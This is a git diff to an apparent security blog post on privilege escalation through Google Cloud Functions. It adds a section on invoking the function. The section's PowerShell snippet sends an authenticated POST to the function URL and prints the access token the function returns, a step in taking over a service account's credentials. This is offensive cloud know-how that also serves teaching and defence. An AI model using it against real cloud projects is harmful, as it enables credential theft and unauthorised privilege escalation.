@@ -18,6 +18,7 @@
     - [Setting IAM Policy Binding to the Cloud Function via gCloud](#setting-iam-policy-binding-to-the-cloud-function-via-gcloud)
     - [Setting IAM Policy Binding to the Cloud Function via Cloud Function API (REST)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-rest)
     - [Setting IAM Policy Binding to the Cloud Function  via Cloud Function API (gRPC)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-grpc)
+  - [Invoking the Cloud Function](#invoking-the-cloud-function)
 - [Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform](#phase-iii---privilege-escalating-via-cloud-function-in-google-cloud-platform)
   - [Deploying the Cloud Function via Cloud Function API (gRPC)](#deploying-the-cloud-function-via-cloud-function-api-grpc)
   - [Setting IAM Policy Binding to the Cloud Function via Cloud Function API (gRPC)](#setting-iam-policy-binding-to-the-cloud-function-via-cloud-function-api-grpc-1)
@@ -832,6 +833,22 @@ py.exe .\main.py --project-id <project-id> --location <region> --function-name <
 <p>
   <img src="https://github.com/anrbn/blog/blob/main/images/27.png">
 </p>
+
+### Invoking the Cloud Function
+With the required access in place we can Invoke the Cloud Function. There are two ways to Invoke Cloud Function depending on whether an Authenticated user (Service Account, Group, User) or Unauthenticated user (allUsers) is given the Role:"Cloud Functon Invocation".
+  
+For Authenticated Users (Service Account, Group, User):
+
+  ```powershell
+$accessToken = $(gcloud auth print-identity-token)
+$headers = @{
+    "Authorization" = "bearer $accessToken"
+    "Content-Type" = "application/json"
+}
+$body = '{}'
+$response = Invoke-RestMethod -Method POST -Uri '<function-invocation-url>' -Headers $headers -Body $body -TimeoutSec 70
+Write-Output $response.access_token
+```
   
 ## Phase III - Privilege Escalating via Cloud Function in Google Cloud Platform
 To Privilege Escalate via Cloud Function in Google Cloud Platform we'll be taking the path with least privileges possible. 
